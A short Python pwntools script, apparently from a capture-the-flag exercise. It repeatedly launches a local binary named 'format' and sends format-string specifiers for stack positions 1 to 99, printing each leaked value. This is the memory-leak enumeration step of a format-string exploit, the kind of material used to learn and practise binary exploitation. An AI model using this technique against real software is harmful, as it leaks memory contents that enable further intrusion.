from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./format', checksec=False)

for i in range(1, 100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        p.sendlineafter(b'> ', '3'.format(i).encode())
        p.sendlineafter(b': ', '%{}$p'.format(i).encode())

        result = p.recvuntil(b'\n\n')

        print(i)
        print(result.decode().split(" ")[-1].strip())
        p.close()
    except EOFError:
        pass